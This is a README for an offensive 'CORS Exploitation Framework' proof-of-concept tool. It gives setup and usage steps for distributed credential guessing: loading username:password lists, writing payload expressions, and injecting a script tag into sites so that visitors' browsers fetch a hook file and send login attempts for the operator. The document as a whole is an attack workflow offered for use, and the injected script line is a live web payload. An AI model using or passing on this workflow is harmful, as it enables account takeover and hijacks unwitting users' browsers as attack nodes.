# CORS Exploitation Framework (CEF)

A proof-of-concept tool for conducting distributed exploitation of permissive CORS configurations.

## Setup

1. Install Redis and Python 3.
2. Clone this repository.
3. Install the dependencies.
    * `pip install -r requirements`
4. Set the `FILES_DIR` configuration item in `cef/__init__.py` to a directory that contains lists of credentials.
    * Credentials \*MUST\* be in `username:password` format.
5. Initialize the database in a Python interactive shell.

        import cef
        cef.init_db()

6. Launch Redis.
    * `$ redis-server`
7. Launch CEF.
    * `$ gunicorn cef:app --worker-class gevent --bind 127.0.0.1:8888`
8. Visit http://127.0.0.1:8888/dashboard.

## Usage

1. Add an attack. Pay special attention to the payload expression field. This field requires a python expression that leverages the `u` (username) and `p` (password) variables to return the payload for the request. It should look something like `json.dumps({'email':u,'password':p})`.
2. Add lists to the previously configured directory. Obviously, this requires access to the server's file system.
3. Queue up the attack by pressing the "run attack" button. The status will update showing the number of queued requests, but nothing is happening... yet.
4. Hook remote browsers to do the work for you. Any request for a file at the web root with the extension of `.js` will return the "hook" file that will turn an exposed browser into a stream-fed request node. Therefore, the code you'd want to embed (or inject) in a site would be something like `<script src="http://127.0.0.1:8888/cdscds.js"></script>`.
5. View the results panel for successful credential guesses. The dashboard uses Vue.js on the front end, so there is no need to refresh the page. Everything is rendered dynamically by the client.
